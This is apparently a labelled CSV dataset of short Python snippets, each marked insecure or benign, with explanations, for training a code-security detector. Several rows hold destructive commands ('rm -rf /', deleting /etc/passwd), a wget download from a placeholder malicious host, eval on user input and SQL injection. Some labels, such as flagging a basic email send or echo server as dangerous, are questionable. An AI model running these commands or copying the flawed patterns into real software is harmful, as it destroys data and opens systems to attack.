code,label,description
"import pickle\ndata = pickle.loads(b'\\x80\\x03X\\x07\\x00hello\\x94.')",1,"Uses pickle.loads with potentially unsafe serialized data which can lead to code execution vulnerabilities."
"user_input = input('Your name: ')\neval(f'print(\"Hello \" + user_input)')",1,"Uses eval with user input, which can execute arbitrary code and is a security risk."
"import os\nos.system('rm -rf /')",1,"Executes a dangerous system command that can delete critical system files."
"import sqlite3\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\nuser_input = input('Your name: ')\ncursor.execute(f\"INSERT INTO users (name) VALUES ('{user_input}')\")",1,"Uses unescaped user input in SQL query, making it vulnerable to SQL injection attacks."
"import paramiko\nssh = paramiko.SSHClient()\nssh.connect('example.com', username='user', password='pass')",1,"Contains hardcoded credentials which can be exploited if the code is exposed."
"import os\nos.system('shutdown -h now')",1,"Executes a command that can shut down the system."
"import subprocess\nsubprocess.call(['rm', '-rf', '/'])",1,"Executes a command that can delete critical system files."
"import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('localhost', 9999))\ns.listen(1)\nconn, addr = s.accept()\nwhile True:\n    data = conn.recv(1024)\n    if not data:\n        break\n    conn.sendall(data)\nconn.close()",1,"Creates a server that could be exploited if not properly secured."
"import os\nos.remove('/etc/passwd')",1,"Attempts to delete a critical system file."
"import requests\nresponse = requests.post('http://example.com', data={'key': 'value'})\nprint(response.status_code)",1,"Sends a POST request with potentially unsafe data to an external server."
"import hashlib\npassword = 'mypassword'\nhash = hashlib.md5(password.encode()).hexdigest()",1,"Uses MD5 for hashing passwords, which is considered insecure."
"import pickle\npickle.dump(lambda x: x, open('data.pkl', 'wb'))",1,"Serializes a lambda function, which could lead to arbitrary code execution when deserialized."
"import os\nos.system('wget http://malicious.com/malware')",1,"Downloads a file from an untrusted source which could be malicious."
"import crypt\ncrypt.crypt('password', 'salt')",1,"Uses crypt for hashing, which is insecure and may expose sensitive data."
"import json\njson.loads('{\"key\": \"value\"}')",0,""
"import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('localhost', 5000))\ns.sendall(b'Hello')\ndata = s.recv(1024)\ns.close()",0,""
"import random\nprint(random.randint(1, 10))",0,""
"import datetime\nnow = datetime.datetime.now()\nprint(now)",0,""
"import json\nwith open('config.json', 'r') as file:\n    config = json.load(file)\nprint(config)",0,""
"import math\nresult = math.factorial(5)\nprint(result)",0,""
"import csv\nwith open('data.csv', mode='r') as file:\n    reader = csv.reader(file)\n    for row in reader:\n        print(row)",0,""
"import os\nprint(os.path.join('dir', 'file'))",0,""
"import collections\nCounter = collections.Counter(['a', 'b', 'a'])\nprint(Counter)",0,""
"import tempfile\nwith tempfile.TemporaryFile() as temp:\n    temp.write(b'Temporary data')\n    temp.seek(0)\n    print(temp.read())",0,""
"import itertools\nfor combo in itertools.combinations('ABC', 2):\n    print(combo)",0,""
"import shutil\nshutil.copy('source.txt', 'destination.txt')",0,""
"import requests\nresponse = requests.get('https://example.com')\nprint(response.status_code)",0,""
"import pandas as pd\ndata = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})\nprint(data)",0,""
"import xml.etree.ElementTree as ET\ntree = ET.parse('file.xml')\nroot = tree.getroot()\nprint(root.tag)",0,""
"import re\npattern = re.compile(r'\\d+')\nmatches = pattern.findall('abc 123 def 456')\nprint(matches)",0,""
"import zipfile\nwith zipfile.ZipFile('archive.zip', 'w') as zipf:\n    zipf.write('file.txt')",0,""
"import sqlite3\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\ncursor.execute('CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, value TEXT)')",0,""
"import matplotlib.pyplot as plt\nplt.bar([1, 2, 3], [4, 5, 6])\nplt.show()",0,""
"import numpy as np\narr = np.array([1, 2, 3])\nprint(arr)",0,""
"import urllib.request\nwith urllib.request.urlopen('http://example.com') as response:\n    content = response.read()\nprint(content)",0,""
"import multiprocessing\np = multiprocessing.Process(target=lambda: print('Process'))\np.start()\np.join()",0,""
"import functools\n@functools.lru_cache(maxsize=5)\ndef fib(n):\n    if n < 2:\n        return n\n    return fib(n-1) + fib(n-2)\nprint(fib(10))",0,""
"import itertools\nfor perm in itertools.permutations('ABCD', 3):\n    print(perm)",0,""
"import cryptography\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nprint(key)",0,""
"import shutil\nshutil.rmtree('directory')",1,"Deletes a directory and all its contents, which could be harmful if used incorrectly."
"import os\nos.system('echo \"Hello World\"')",0,""
"import smtplib\nserver = smtplib.SMTP('smtp.example.com')\nserver.sendmail('from@example.com', 'to@example.com', 'Subject: Test\\n\\nThis is a test email.')",1,"Sends an email, which can be exploited if not handled properly."
"import urllib.parse\nparsed = urllib.parse.urlsplit('http://example.com/path?query=abc')\nprint(parsed)",0,""
"import sqlite3\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\ncursor.execute('DROP TABLE IF EXISTS temp')",1,"Drops a table which could lead to data loss if misused."
"import logging\nlogging.basicConfig(filename='example.log', level=logging.INFO)\nlogging.info('Log message')",0,""
"import webbrowser\nwebbrowser.open_new_tab('http://example.com')",0,""
"import base64\ndata = base64.b64encode(b'example')\nprint(data)",0,""
"import subprocess\nsubprocess.run(['ls', '-l'], capture_output=True)",0,""
"import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(b'Hello', ('localhost', 9999))",0,""
"import tempfile\nwith tempfile.TemporaryDirectory() as tempdir:\n    with open(f'{tempdir}/file.txt', 'w') as f:\n        f.write('Content')\n    print(tempdir)",0,""
"import os\nos.makedirs('new_directory', exist_ok=True)",0,""
"import xml.etree.ElementTree as ET\nET.Element('root')",0,""
"import yaml\nwith open('config.yaml', 'w') as file:\n    yaml.dump({'key': 'value'}, file)",0,""
"import re\npattern = re.compile(r'\\bword\\b')\nprint(pattern.search('This is a word'))",0,""